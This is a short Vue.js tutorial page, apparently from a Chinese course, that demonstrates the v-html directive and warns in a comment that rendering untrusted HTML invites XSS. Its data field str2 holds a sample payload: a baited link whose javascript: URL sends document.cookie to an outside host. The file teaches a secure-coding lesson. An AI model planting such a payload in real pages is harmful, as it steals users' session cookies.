<!DOCTYPE html>
<html lang="en">
<head>
    <title>v-html</title>
    <script src="../js/vue.js" type="text/javascript"></script>
</head>

<body>
    <!-- 
        v-html指令：
            1、作用:向指定节点中渲染包含html结构内容
            2、与插值语法的区别:
                (1).v-html会替换节点中所有的内容，{{xx}}不会
                (2).v-html可以识别html结构
            3、注意:
                v-html有安全性问题！！！
                (1).在网站上动态渲染任意的html非常危险的，容易导致xss攻击
                (2).一定要可信的内容上使用v-html，用不要用在用户提交的你内容上。
                    
     -->
    <div id="root">
        <div>你好啊！{{name}}</div>
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false
    
    new Vue({
        el:'#root',
        data:{
            name:'尚硅谷',
            str:'<h3>你好啊</h3>',
            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到了你想要的资源</a>',
        }
    })
</script>
</html>
